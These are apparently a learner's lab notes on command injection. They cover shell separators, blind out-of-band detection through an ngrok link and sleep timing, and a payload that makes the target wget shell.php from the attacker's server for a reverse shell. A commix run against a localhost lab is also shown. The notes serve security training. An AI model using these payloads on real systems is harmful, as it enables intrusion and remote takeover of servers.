# Basics
Command injection involves executing arbitrary commands on a host OS through a vulnerable application.

- On a website with a network check feature, I input an IP/domain and observed the `curl` request:

- Exploiting special operators like `| && || ;`, I executed commands after the IP/domain:
```bash
127.0.0.1 ; ls -l / #
```


# Blind / Out-of-Band
- no feedback = blind

- tested payload `127.0.0.1; ls #`
	- semicolon filtered
  


- We initiated Ngrok for localhost tunnel
```bash
$ ngrok http 80
```

-  inserted link on site
```
https://ngrok-link?`cmd`
```
- check on ngrok interface

- test with sleep
	- using `sleep` command, to check if blind command injection  is possible:
	```HTML
	https://tcm-sec.com?`sleep 15`
	https://tcm-sec.com?`sleep 40`
	```
	- works
# **Exploitation**
- Python server:
```bash
$ python3 -m http.server 80
```

- Using **Wappalyzer**, for reverse shell type

```HTML
# Using WGET
127.0.0.1?`wget 192.168.57.21:443/shell.php`
```
- go to /shell.php to trigger
- got revshell
#  Challenge

- website with a feature for redirecting vehicles
- **ALG**, the only vehicle parked. Here's what I saw:
- To explore Command Injection vulnerability, Burp Suite to intercept requests:
	- Identifying parameters (`plate`, `posx`, `posy`)
	- run commix to automate injection
```bash
commix -u http://localhost/labs/c0x03.php --data='posy=300' --level 3
```
